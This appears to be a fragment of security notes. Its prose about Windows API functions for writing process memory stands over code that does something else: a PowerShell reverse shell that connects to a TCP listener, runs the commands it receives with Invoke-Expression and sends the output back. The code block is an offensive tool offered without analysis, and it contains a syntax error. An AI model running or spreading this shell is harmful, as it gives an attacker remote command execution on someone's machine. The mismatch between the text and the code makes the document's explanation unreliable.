# Theory
> Responders should not rush to kick an attacker out before theyâ€™ve got
> the full picture of what they were looking at and what has been exfiltrated
### Windows API Functions
<p>There has always been many ways to write memory to a process, but achieving it is much harder.</p>
<p>We want to strategically read a process memory, and write specifically to the executable portion.</p>
<p>We will use the following to do so.</p>

```powershell
$ReverseShellConnection = New-Object System.Net.Sockets.TCPClient("127.0.0.1", 4444)
$NetworkStream = $ReverseShellConnection.GetStream()
$ReadBuffer = New-Object Byte[] 65536

while (($BytesRead = $NetworkStream.Read($ReadBuffer, 0, $ReadBuffer.Length)) -ne 0) {
    $CommandOutput = [System.Text.Encoding]::ASCII.GetString($ReadBuffer, 0, $BytesRead)
    $ExecutedOutput = Invoke-Expression $CommandOutput 2>&1) | Out-String
    $PromptWithOutput = $ExecutedOutput + [Environment]::UserName + '@' + [System.Net.Dns]::GetHostName() + ' [' + $(Get-Location) + ']~$ '
    $OutputBytes = [text.encoding]::ASCII.GetBytes($PromptWithOutput)
    $NetworkStream.Write($OutputBytes, 0, $OutputBytes.Length)
    $NetworkStream.Flush()
}

$ReverseShellConnection.Close()
```
